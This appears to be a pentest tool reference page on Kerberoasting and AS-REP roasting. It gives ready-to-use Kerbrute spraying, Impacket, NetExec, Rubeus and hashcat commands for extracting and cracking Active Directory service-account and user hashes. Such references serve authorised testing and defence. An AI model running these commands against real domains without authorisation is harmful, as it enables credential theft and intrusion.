# Kerberos Attacks (Kerberoasting, AS-REP Roasting)

> Concepts and tooling for abusing Kerberos in Active Directory — extract
> crackable tickets for service accounts (Kerberoasting) and pre-auth-disabled
> users (AS-REP roasting), enumerate/spray with Kerbrute, and abuse tickets
> with Rubeus.

- **Link:** https://github.com/GhostPack/Rubeus · https://github.com/ropnop/kerbrute
- **Type:** open source
- **Platform:** Rubeus (Windows/.NET) · Kerbrute (cross-platform, Go)

## Description

Modern AD favours Kerberos over NTLM, but Kerberos has its own well-known
weaknesses. Two credential-access attacks stand out because they need only a
low-privileged foothold (and AS-REP roasting sometimes none):

- **Kerberoasting** — any authenticated user can request a service ticket
  (TGS-REP) for an account that has a Service Principal Name (SPN). Part of that
  ticket is encrypted with the service account's password hash, so you can crack
  it offline. Service accounts often have weak, non-expiring passwords.
- **AS-REP Roasting** — accounts with "Do not require Kerberos preauthentication"
  set will hand out an AS-REP whose encrypted portion is crackable offline, and
  you don't need to be authenticated to ask.

Supporting tools: **Kerbrute** for fast username enumeration and password
spraying against the KDC, and **Rubeus** for the full ticket lifecycle on
Windows (roasting, requesting/renewing tickets, pass-the-ticket, overpass-the-hash).

## Installation

```bash
# Kerbrute — download a release binary or build from source
go install github.com/ropnop/kerbrute@latest

# Rubeus — .NET; grab a release or compile from source
#   https://github.com/GhostPack/Rubeus  (often run in-memory on the target)

# Cross-platform roasting is also built into Impacket / NetExec (see below)
```

## Usage examples

### Enumeration and spraying — Kerbrute

```bash
# Validate which usernames exist in the domain (no lockout risk)
kerbrute userenum -d corp.local --dc 10.0.0.1 users.txt

# Password spray one password across many users
kerbrute passwordspray -d corp.local --dc 10.0.0.1 users.txt 'Spring2026!'
```

### Kerberoasting

```bash
# Cross-platform: request TGS-REP hashes for all SPN accounts (Impacket)
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 'corp.local/jsmith:Passw0rd!' -outputfile kerb.txt

# From NetExec's LDAP module
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --kerberoasting kerb.txt
```

```powershell
# On a domain-joined Windows host with Rubeus
Rubeus.exe kerberoast /outfile:kerb.txt
```

```bash
# Crack the TGS-REP hashes offline (Hashcat mode 13100)
hashcat -m 13100 kerb.txt rockyou.txt
```

### AS-REP roasting

```bash
# Impacket — pull AS-REP hashes for preauth-disabled accounts
impacket-GetNPUsers -dc-ip 10.0.0.1 'corp.local/' -usersfile users.txt -no-pass -outputfile asrep.txt

# NetExec equivalent
nxc ldap dc01.corp.local -u jsmith -p 'Passw0rd!' --asreproast asrep.txt
```

```bash
# Crack AS-REP hashes offline (Hashcat mode 18200)
hashcat -m 18200 asrep.txt rockyou.txt
```

## Notes & references

- Hashcat modes: **13100** = Kerberoast (TGS-REP), **18200** = AS-REP — see
  [Password Cracking & Hashing](../password-cracking/).
- Ticket requests and roasting can also be done with [Impacket](impacket.md) and
  [NetExec](netexec.md); find roastable accounts fast with [BloodHound](bloodhound.md).
- HackTricks Kerberoast: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast
- ired.team Kerberoasting: https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting
